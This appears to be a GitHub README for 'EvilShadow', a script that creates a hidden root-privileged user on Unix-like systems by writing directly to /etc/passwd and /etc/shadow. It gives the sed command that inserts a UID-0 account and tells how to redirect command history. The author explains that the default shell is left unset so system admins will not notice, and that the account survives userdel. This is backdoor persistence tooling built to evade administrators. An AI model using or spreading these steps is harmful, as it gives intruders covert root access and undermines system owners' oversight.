# EvilShadow
Evil Shadow - Create Hidden Users in Unix-Like OS

## How does it work?
It creates a user with root group privileges using only shadow and passwd files. So when you login, You will notice that you are currently logged in with username root (Even though you aren't).

Commands history also will be saved in ```/.bash_history```, You can change this by specifying another home directory in script.

**For instance** you wanna change it to ```/var/cache```:

Replace

```sed "2i$USERNAME:x:0:0::/:" /etc/passwd > .passwd```

by

```sed "2i$USERNAME:x:0:0::/var/cache:" /etc/passwd > .passwd```

in Script.sh at line 14

## Dependencies
You must have **OpenSSL** and **sudo** installed in order Script to work

In Arch Linux:
```pacman -S openssl sudo```

in Debian Distros:
```apt install openssl sudo```

## Note
After you logged in you can change your shell to bash by simply entering command ```bash```.

I didn't want to make it obvious to system admins by putting /bin/bash as your default shell.

Also you can't just remove the user by executing ```userdel $USERNAME```. If you wanna remove the hidden user, Do it by deleting lines that starts with ```$USERNAME:``` in ```/etc/shadow``` and ```/etc/passwd```

## Feedback

Suggestions/Improvements are
[welcome](https://github.com/SajedMohseni/EvilShadow/issues)!

## Author

[Sajed Mohseni](mailto:S4jed@ProtonMail.com)
